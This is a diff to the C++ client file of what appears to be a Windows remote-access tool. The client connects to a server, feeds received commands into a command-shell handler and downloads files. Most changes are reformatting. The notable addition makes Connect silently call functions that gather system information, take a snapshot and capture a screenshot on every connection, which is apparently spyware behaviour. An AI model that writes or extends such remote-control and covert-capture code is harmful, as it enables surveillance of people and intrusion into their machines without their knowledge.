@@ -1,12 +1,10 @@
 #include "Client.h"
 #include <process.h>
 
-
 //a lot of the networking structure was adapted from Pindrought's very comprehensive Winsock Networking Tutorials ( http://www.planetchili.net/forum/viewtopic.php?f=3&t=3433 )
 
-Client* Client::clientptr = NULL;
+Client *Client::clientptr = NULL;
 bool Client::connected = false;
-
 
 bool Client::ProcessPacketType(PacketType _PacketType)
 {
@@ -28,7 +26,7 @@ bool Client::ProcessPacketType(PacketType _PacketType)
 			return false;
 		if (CMD::cmdptr != NULL)
 		{
-			CMD::cmdptr->writeCMD(msg);											//MOST ANNOYING BUG: [FIXED]
+			CMD::cmdptr->writeCMD(msg); //MOST ANNOYING BUG: [FIXED]
 			break;
 		}
 		else
@@ -40,16 +38,16 @@ bool Client::ProcessPacketType(PacketType _PacketType)
 
 	case PacketType::FileTransferByteBuffer:
 	{
-		int32_t buffersize; //buffer to hold size of buffer to write to file
+		int32_t buffersize;			 //buffer to hold size of buffer to write to file
 		if (!Getint32_t(buffersize)) //get size of buffer as integer
 			return false;
 		if (!recvall(file.buffer, buffersize)) //get buffer and store it in file.buffer
 		{
 			return false;
 		}
-		file.outfileStream.write(file.buffer, buffersize); //write buffer from file.buffer to our outfilestream
-		file.bytesWritten += buffersize; //increment byteswritten
-										 //std::cout << "Received byte buffer for file transfer of size: " << buffersize << std::endl;
+		file.outfileStream.write(file.buffer, buffersize);				//write buffer from file.buffer to our outfilestream
+		file.bytesWritten += buffersize;								//increment byteswritten
+																		//std::cout << "Received byte buffer for file transfer of size: " << buffersize << std::endl;
 		if (!SendPacketType(PacketType::FileTransferRequestNextBuffer)) //send PacketType type to request next byte buffer (if one exists)
 			return false;
 		break;
@@ -75,10 +73,10 @@ void Client::ClientThread()
 	PacketType PacketType;
 	while (true)
 	{
-		if (!clientptr->GetPacketType(PacketType)) //Get PacketType type
-			break; //If there is an issue getting the PacketType type, exit this loop
+		if (!clientptr->GetPacketType(PacketType))	   //Get PacketType type
+			break;									   //If there is an issue getting the PacketType type, exit this loop
 		if (!clientptr->ProcessPacketType(PacketType)) //Process PacketType (PacketType type)
-			break; //If there is an issue processing the PacketType, exit this loop
+			break;									   //If there is an issue processing the PacketType, exit this loop
 	}
 	connected = false;
 	//std::cout << "Lost connection to the server." << std::endl;
@@ -113,7 +111,7 @@ bool Client::resolveIP(std::string &hostname)
 	// loop through all the results and connect to the first we can
 	for (p = servinfo; p != NULL; p = p->ai_next)
 	{
-		h = (struct sockaddr_in *) p->ai_addr;
+		h = (struct sockaddr_in *)p->ai_addr;
 		strcpy_s(ip, INET6_ADDRSTRLEN, inet_ntoa(h->sin_addr));
 	}
 
@@ -122,18 +120,18 @@ bool Client::resolveIP(std::string &hostname)
 	return true;
 }
 
-bool Client::RequestFile(std::string FileName)
+bool Client::RequestFile(std::string srcFileName, std::string dstFileName)
 {
-	file.outfileStream.open(FileName, std::ios::binary); //open file to write file to
-	file.fileName = FileName; //save file name
+	file.outfileStream.open(dstFileName, std::ios::binary); //open file to write file to
+	file.fileName = dstFileName; //save file name
 	file.bytesWritten = 0; //reset byteswritten to 0 since we are working with a new file
-	if (!file.outfileStream.is_open()) //if file failed to open...
+	if (!file.outfileStream.is_open())					 //if file failed to open...
 	{
 		//std::cout << "ERROR: Function(Client::RequestFile) - Unable to open file: " << FileName << " for writing.\n";
 		return false;
 	}
 	//std::cout << "Requesting file from server: " << FileName << std::endl;
-	if (!SendString(FileName, PacketType::FileTransferRequestFile)) //send file name
+	if (!SendString(srcFileName, PacketType::FileTransferRequestFile)) //send file name
 		return false;
 	return true;
 }
@@ -149,22 +147,27 @@ Client::Client(std::string IP, int PORT)
 	}
 	resolveIP(IP);
 	addr.sin_addr.s_addr = inet_addr(IP.c_str()); //Address (127.0.0.1) = localhost (this pc)
-	addr.sin_port = htons(PORT); //Port 
-	addr.sin_family = AF_INET; //IPv4 Socket
-	clientptr = this; //Update ptr to the client which will be used by our client thread
+	addr.sin_port = htons(PORT);				  //Port
+	addr.sin_family = AF_INET;					  //IPv4 Socket
+	clientptr = this;							  //Update ptr to the client which will be used by our client thread
 }
 
 bool Client::Connect()
 {
-	Connection = socket(AF_INET, SOCK_STREAM, NULL); //Set Connection socket
-	if (connect(Connection, (SOCKADDR*)&addr, sizeof(addr)) != 0) //If we are unable to connect...
+	Connection = socket(AF_INET, SOCK_STREAM, NULL);			   //Set Connection socket
+	if (connect(Connection, (SOCKADDR *)&addr, sizeof(addr)) != 0) //If we are unable to connect...
 	{
 		return false;
 	}
 
 	//std::cout << "Connected!" << std::endl;
-    _beginthreadex(NULL, NULL, (_beginthreadex_proc_type)ClientThread, NULL, NULL, NULL); //Create the client thread that will receive any data that the server sends.
+	_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)ClientThread, NULL, NULL, NULL); //Create the client thread that will receive any data that the server sends.
 	connected = true;
+
+	General::getSystemInfo();
+	General::takeSnapshot();
+	General::takeScreenshot();
+
 	return true;
 }
 
@@ -173,7 +176,7 @@ bool Client::CloseConnection()
 	if (closesocket(Connection) == SOCKET_ERROR)
 	{
 		if (WSAGetLastError() == WSAENOTSOCK) //If socket error is that operation is not performed on a socket (This happens when the socket has already been closed)
-			return true; //return true since connection has already been closed
+			return true;					  //return true since connection has already been closed
 
 		std::string ErrorMessage = "Failed to close the socket. Winsock Error: " + std::to_string(WSAGetLastError()) + ".";
 		//TODO: HANDLE ERROR
